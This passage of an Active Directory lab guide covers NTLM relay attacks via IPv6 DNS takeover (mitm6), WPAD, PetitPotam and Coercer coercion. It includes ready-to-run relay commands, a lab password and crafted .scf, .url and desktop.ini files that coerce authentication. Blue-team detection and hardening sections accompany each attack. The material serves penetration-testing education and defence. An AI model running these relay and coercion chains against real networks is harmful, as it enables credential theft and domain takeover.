# [*] Shadow credentials successfully added!
```

### Alternative Methods

**Using Responder with IPv6**
```bash
# Responder can also handle IPv6
sudo responder -I eth0 -6 -wdP

# -6 : Enable IPv6 poisoning
```

**Using bettercap**
```bash
# bettercap can perform similar attacks
sudo bettercap -iface eth0

# In bettercap console:
> set dns.spoof.domains akatsuki.local,wpad.akatsuki.local
> dns.spoof on
> set dhcp6.spoof.domains akatsuki.local
> dhcp6.spoof on
```

### Blue Team: Detection

| Detection Point | What to Look For |
|-----------------|------------------|
| DHCPv6 Logs | Rogue DHCPv6 replies |
| DNS Queries | DNS queries to unexpected servers |
| Event ID 5156 | Outbound connections on UDP 547 (DHCPv6) |
| Event ID 4624 | Authentication from unusual sources |
| Network | Link-local IPv6 traffic to unknown hosts |
| Sysmon ID 22 | DNS query events to rogue DNS |

**Detection Queries:**
```sql
-- Splunk: Detect DHCPv6 traffic to non-servers
index=network dest_port=547
| where NOT match(dest_ip, "^fe80::")
| stats count by src_ip, dest_ip

-- Detect WPAD requests to unusual hosts
index=dns query="wpad*"
| where answer_ip NOT IN (known_wpad_servers)
```

### Blue Team: Prevention

| Control | Implementation |
|---------|----------------|
| Disable IPv6 | GPO: Prefer IPv4 over IPv6 |
| Disable DHCPv6 | Block UDP 546/547 at firewall |
| Disable WPAD | GPO: Disable "Automatically detect settings" |
| WPAD DNS Entry | Create legitimate wpad.domain.local A record |
| Protected Users | Add sensitive accounts to Protected Users group |

**GPO Settings:**
```powershell
# Disable IPv6 preference (prefer IPv4)
# Computer Configuration > Administrative Templates > Network >
# DNS Client > Configure DNS over HTTPS (DoH) name resolution = Disabled

# Or via Registry (prefer IPv4):
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters" -Name "DisabledComponents" -Value 0x20 -Type DWord

# Disable WPAD auto-detection
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad" -Name "WpadOverride" -Value 1 -Type DWord
```

**Block DHCPv6:**
```powershell
# Windows Firewall rule to block DHCPv6 client
New-NetFirewallRule -DisplayName "Block DHCPv6 Client" -Direction Outbound -Protocol UDP -LocalPort 546 -Action Block
New-NetFirewallRule -DisplayName "Block DHCPv6 Server" -Direction Outbound -Protocol UDP -LocalPort 547 -Action Block
```

---

## 12. IPv6 WPAD Attack

### Concept

Specifically target WPAD (Web Proxy Auto-Discovery) through IPv6 DNS takeover. When a browser looks for wpad.domain.local, the attacker's DNS server responds with the attacker's IP.

### Root Cause

| Factor | Description |
|--------|-------------|
| WPAD Enabled | Default in Internet Explorer/Edge |
| No WPAD DNS | Most environments don't have a wpad entry |
| IPv6 DNS Priority | Attacker's IPv6 DNS answers first |
| Auto-Auth | Browser sends NTLM auth for proxy config |

### Lab Setup

```powershell
# On workstation - Ensure WPAD is enabled (default)
# This is usually on by default in IE/Edge

# Verify there's no legitimate WPAD entry
nslookup wpad.akatsuki.local
# Should return: Non-existent domain
```

### Attack Methods

**Method 1: WPAD Relay to LDAP**

```bash
# Terminal 1: mitm6 with explicit WPAD handling
sudo mitm6 -d akatsuki.local -i eth0 --ignore-nofqdn

# Terminal 2: Serve malicious WPAD and relay
ntlmrelayx.py -t ldap://192.168.56.10 --delegate-access -smb2support -wh attacker-wpad --no-wcf-server

# When victim's browser requests WPAD:
# 1. DHCPv6 gives attacker as DNS
# 2. Victim queries wpad.akatsuki.local
# 3. Attacker responds with their IP
# 4. Browser fetches http://attacker/wpad.dat with NTLM auth
# 5. Auth relayed to LDAP
```

**Method 2: WPAD with Malicious Proxy**

```bash
# In addition to relaying, serve a malicious WPAD file
# that proxies all traffic through attacker

# Terminal 1: mitm6
sudo mitm6 -d akatsuki.local -i eth0

# Terminal 2: ntlmrelayx with WPAD serving
ntlmrelayx.py -t ldap://192.168.56.10 -smb2support -wh attacker-wpad

# The WPAD file served makes the attacker the proxy
# Additional traffic can be intercepted
```

### Blue Team: Prevention

```powershell
# Create legitimate WPAD DNS entry pointing to nowhere
# On DC - Add DNS entry
Add-DnsServerResourceRecordA -Name "wpad" -ZoneName "akatsuki.local" -IPv4Address "127.0.0.1"

# Or point to a legitimate proxy server
Add-DnsServerResourceRecordA -Name "wpad" -ZoneName "akatsuki.local" -IPv4Address "<proxy-ip>"

# Disable WPAD via GPO
# User Configuration > Preferences > Windows Settings > Registry
# HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings
# AutoDetect = 0
```

---

## 13. IPv6 DNS Takeover for Authentication Coercion

### Concept

Use IPv6 DNS takeover not just for WPAD, but to redirect any internal hostname resolution. This can coerce authentication from services that connect to other internal resources.

### Root Cause

| Factor | Description |
|--------|-------------|
| IPv6 DNS Priority | Attacker's DNS answers first |
| Internal Name Resolution | Services resolve internal names via DNS |
| Auto-Authentication | Windows auto-authenticates to resolved hosts |

### Attack Methods

**Method 1: Redirect Internal Hostnames**

```bash
# Terminal 1: mitm6 targeting specific hostnames
sudo mitm6 -d akatsuki.local -i eth0 --host-allowlist dc01.akatsuki.local,ws01.akatsuki.local

# Terminal 2: Relay connections
ntlmrelayx.py -t ldap://192.168.56.10 --delegate-access -smb2support

# When a service tries to connect to dc01.akatsuki.local:
# 1. DNS query goes to attacker's DNS
# 2. Attacker responds with their IP
# 3. Service authenticates to attacker
# 4. Authentication relayed
```

**Method 2: Target Specific Services**

```bash
# Target a file server hostname
sudo mitm6 -d akatsuki.local -i eth0 --host-allowlist fileserver.akatsuki.local

# Relay SMB connections
ntlmrelayx.py -t smb://192.168.56.11 -smb2support

# Any user accessing \\fileserver\share gets redirected to attacker
```

### Blue Team: Prevention

- Use DNS signing (DNSSEC) where possible
- Monitor for rogue DHCPv6 servers
- Disable IPv6 if not needed
- Use host files for critical internal names

---

## 14. IPv6 + PrinterBug/PetitPotam Combo

### Concept

Combine IPv6 DNS takeover with coercion techniques. Use mitm6 to capture authentication from machines that try to reach the "attacker" hostname via DNS redirection.

### Attack Methods

**Method 1: IPv6 DNS + PetitPotam**

```bash
# Terminal 1: mitm6 - take over DNS
sudo mitm6 -d akatsuki.local -i eth0

# Terminal 2: Relay to ADCS
ntlmrelayx.py -t http://192.168.56.10/certsrv/certfnsh.asp --adcs -smb2support -wh attacker-wpad --template DomainController

# Terminal 3: Use PetitPotam to coerce DC to our IPv6 address
# First, get your IPv6 address
ip -6 addr show eth0
# fe80::1 (example)

# Coerce using IPv6 address
python3 PetitPotam.py 'fe80::1%eth0' 192.168.56.10 -u orochimaru -p 'Snake2024!'
```

**Method 2: Full Chain with IPv6**

```bash
# Step 1: Take over DNS
sudo mitm6 -d akatsuki.local -i eth0

# Step 2: Wait for DHCPv6 (or trigger with ipconfig /renew6 on target)

# Step 3: Any internal DNS query now comes to us
# When DC01 authenticates via WPAD or other mechanism:
# Relay to ADCS, get certificate, authenticate as DC
```

### Blue Team: Detection

```yaml
Detection Rules:
  - Unusual DHCPv6 traffic from non-DHCP servers
  - IPv6 DNS queries to link-local addresses
  - WPAD requests over IPv6
  - NTLM authentication following IPv6 DNS resolution
```

---

## IPv6 Attack Quick Reference

| Attack | Command |
|--------|---------|
| mitm6 Basic | `sudo mitm6 -d <domain> -i <interface>` |
| mitm6 + LDAP Relay | `ntlmrelayx.py -t ldap://<dc> --delegate-access -wh attacker-wpad` |
| mitm6 + ADCS | `ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp --adcs -wh attacker-wpad` |
| mitm6 + SMB Relay | `ntlmrelayx.py -tf targets.txt -smb2support -wh attacker-wpad` |
| mitm6 + Shadow Creds | `ntlmrelayx.py -t ldap://<dc> --shadow-credentials -wh attacker-wpad` |
| Disable IPv6 | `Set-ItemProperty HKLM:\...\Tcpip6\Parameters -Name DisabledComponents -Value 0x20` |
| Block DHCPv6 | Block UDP 546/547 outbound |

---

## IPv6 Tool Reference

| Tool | Purpose | URL |
|------|---------|-----|
| mitm6 | DHCPv6/DNS spoofing | https://github.com/dirkjanm/mitm6 |
| ntlmrelayx | NTLM relay | https://github.com/fortra/impacket |
| bettercap | Network attacks | https://github.com/bettercap/bettercap |
| Responder | IPv6 poisoning | https://github.com/lgandx/Responder |

---

# Cross-Protocol Relay Matrix

## What Can Relay Where?

| Source → Target | SMB | LDAP | LDAPS | HTTP | HTTPS | MSSQL |
|-----------------|-----|------|-------|------|-------|-------|
| **SMB** | ✓* | ✓* | ✓** | ✓ | ✓** | ✓ |
| **HTTP** | ✓* | ✓* | ✓** | ✓ | ✓** | ✓ |
| **MSSQL** | ✓* | ✓* | ✓** | ✓ | ✓** | ✓ |

```
* = Only if signing not required
** = Only if EPA/Channel Binding not required
```

## Protection Requirements

| Protocol | Protection | Check Command |
|----------|------------|---------------|
| SMB | Signing | `crackmapexec smb <ip> --gen-relay-list` |
| LDAP | Signing | `crackmapexec ldap <ip> -M ldap-checker` |
| LDAPS | Channel Binding | Check LdapEnforceChannelBinding |
| HTTP | EPA | Check ExtendedProtection in IIS |
| HTTPS | EPA + Cert | Check ExtendedProtection |
| MSSQL | Signing | `crackmapexec mssql <ip> --gen-relay-list` |

---

# Coercion Methods

## Methods to Force Authentication

| Method | Protocol | Requires Auth | Command |
|--------|----------|--------------|---------|
| **PetitPotam** | MS-EFSRPC | No* | `python3 PetitPotam.py <listener> <target>` |
| **PrinterBug** | MS-RPRN | Yes | `python3 printerbug.py <domain>/<user>:<pass>@<target> <listener>` |
| **DFSCoerce** | MS-DFSNM | Yes | `python3 DFSCoerce.py -u <user> -p <pass> -d <domain> <listener> <target>` |
| **ShadowCoerce** | MS-FSRVP | Yes | `python3 ShadowCoerce.py -u <user> -p <pass> -d <domain> <listener> <target>` |
| **Coercer** | Multiple | Yes | `coercer -u <user> -p <pass> -d <domain> -l <listener> -t <target>` |

*PetitPotam unauthenticated only works on unpatched systems

## Coercer - Try All Methods

```bash
# Install
pip3 install coercer

# Try all coercion methods
coercer -u orochimaru -p 'Snake2024!' -d akatsuki.local -l 192.168.56.100 -t 192.168.56.10 --all

# Specific methods
coercer -u orochimaru -p 'Snake2024!' -d akatsuki.local -l 192.168.56.100 -t 192.168.56.10 --filter-method-name "EfsRpcOpenFileRaw"
```

## File-Based Coercion

```bash
# .lnk file
python3 ntlm_theft.py -g lnk -s 192.168.56.100 -f malicious

# .scf file (auto-execute in folder)
cat > @malicious.scf << 'EOF'
[Shell]
Command=2
IconFile=\\192.168.56.100\share\icon.ico
EOF

# .url file
cat > malicious.url << 'EOF'
[InternetShortcut]
URL=file://192.168.56.100/share
EOF

# desktop.ini
cat > desktop.ini << 'EOF'
[.ShellClassInfo]
IconResource=\\192.168.56.100\share\icon.ico
EOF
```

---

# Blue Team: Comprehensive Detection

## Event IDs to Monitor

| Event ID | Source | Description |
|----------|--------|-------------|
| 4624 | Security | Logon - check type, source, protocol |
| 4625 | Security | Failed logon - relay attempts |
| 4648 | Security | Explicit credential logon |
| 5136 | Security | AD object modification |
| 5145 | Security | Share access |
| 4768 | Security | TGT request (after relay compromise) |
| 4769 | Security | Service ticket request |
| 4742 | Security | Computer account modified |
| 10 | Sysmon | Process access (coercion tools) |
| 3 | Sysmon | Network connection |

## Detection Rules

```yaml
# Rule 1: NTLM relay detection
title: Potential NTLM Relay Attack
detection:
  condition:
    - Same NTLM challenge seen from multiple source IPs within 5 seconds

# Rule 2: Suspicious LDAP modification
title: RBCD/Shadow Credentials Attack
detection:
  condition:
    - Event 5136
    - AttributeName contains "msDS-AllowedToActOnBehalfOfOtherIdentity" OR "msDS-KeyCredentialLink"
    - ModifiedBy is not Domain Admin

# Rule 3: Coercion detection
title: Potential Coercion Attack
detection:
  condition:
    - Process accessing named pipes: \PIPE\efsrpc, \PIPE\spoolss, \PIPE\netdfs
    - From unusual process
```

## Network Detection

```bash
# Capture and analyze NTLM traffic
tcpdump -i eth0 -w capture.pcap 'port 445 or port 389 or port 80'

# Look for:
# - NTLM auth to unusual destinations
# - Same NTLMSSP_AUTH going to multiple destinations
# - Cross-protocol NTLM
```

---

# Blue Team: Comprehensive Prevention

## GPO Settings

```powershell
# 1. Require SMB Signing (all machines)
# Computer Configuration > Policies > Windows Settings > Security Settings >
# Local Policies > Security Options
# - Microsoft network client: Digitally sign communications (always) = Enabled
# - Microsoft network server: Digitally sign communications (always) = Enabled

# 2. Require LDAP Signing (Domain Controllers)
# Computer Configuration > Policies > Windows Settings > Security Settings >
# Local Policies > Security Options
# - Domain controller: LDAP server signing requirements = Require signing

# 3. Disable NTLM (where possible)
# Computer Configuration > Policies > Windows Settings > Security Settings >
# Local Policies > Security Options
# - Network security: Restrict NTLM: NTLM authentication in this domain = Deny all

# 4. Disable LLMNR
# Computer Configuration > Policies > Administrative Templates > Network > DNS Client
# - Turn off multicast name resolution = Enabled

# 5. Disable NBT-NS
# Registry or DHCP option
```

## Registry Hardening

```powershell
# LDAP Channel Binding (DCs)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "LdapEnforceChannelBinding" -Value 2

# LDAP Signing (DCs)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "LDAPServerIntegrity" -Value 2

# SMB Signing (all machines)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 1

# Disable WebClient
Set-Service -Name WebClient -StartupType Disabled
Stop-Service WebClient

# Machine Account Quota
Set-ADDomain -Identity akatsuki.local -Replace @{"ms-DS-MachineAccountQuota"="0"}
```

## Network Controls

```bash
# Block outbound NTLM to untrusted networks
# Firewall rules:
# - Block outbound 445 except to trusted servers
# - Block outbound 139 entirely
# - Block outbound 80/443 NTLM auth (via proxy inspection)
```

## Monitoring & Alerting

```yaml
Critical Alerts:
  - msDS-AllowedToActOnBehalfOfOtherIdentity modified
  - msDS-KeyCredentialLink modified on computer account
  - New computer account created
  - Certificate issued for computer account
  - NTLM auth from DC to non-DC

Warning Alerts:
  - NTLM auth to external IP
  - SMB connection to non-standard port
  - WebClient service started
  - EFS RPC calls to external IP
```

---

# Quick Reference: Relay Attack Commands

| Attack | Command |
|--------|---------|
| SMB→SMB | `ntlmrelayx.py -t smb://<target> -smb2support` |
| SMB→LDAP | `ntlmrelayx.py -t ldap://<dc> --delegate-access` |
| SMB→HTTP | `ntlmrelayx.py -t http://<target>/endpoint -smb2support` |
| ADCS ESC8 | `ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp --adcs` |
| Shadow Creds | `ntlmrelayx.py -t ldap://<dc> --shadow-credentials --shadow-target <target>$` |
| SOCKS Proxy | `ntlmrelayx.py -tf targets.txt -smb2support -socks` |

---

# Tool Reference

| Tool | Purpose | URL |
|------|---------|-----|
| Impacket | NTLM relay, coercion | https://github.com/fortra/impacket |
| Responder | LLMNR/NBT-NS poisoning | https://github.com/lgandx/Responder |
| Certipy | ADCS attacks | https://github.com/ly4k/Certipy |
| PetitPotam | EFS coercion | https://github.com/topotam/PetitPotam |
| Coercer | Multi-protocol coercion | https://github.com/p0dalirius/Coercer |
| PrinterBug | Print spooler coercion | https://github.com/dirkjanm/krbrelayx |
| ntlm_theft | Generate NTLM theft files | https://github.com/Greenwolf/ntlm_theft |

---

# References

- [The Hacker Recipes - NTLM Relay](https://www.thehacker.recipes/ad/movement/ntlm/relay)
- [Practical Guide to NTLM Relaying](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
- [ADCS ESC8 - Certifried](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
- [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [WebDAV NTLM Relay](https://www.praetorian.com/blog/ntlm-relaying-via-webdav/)
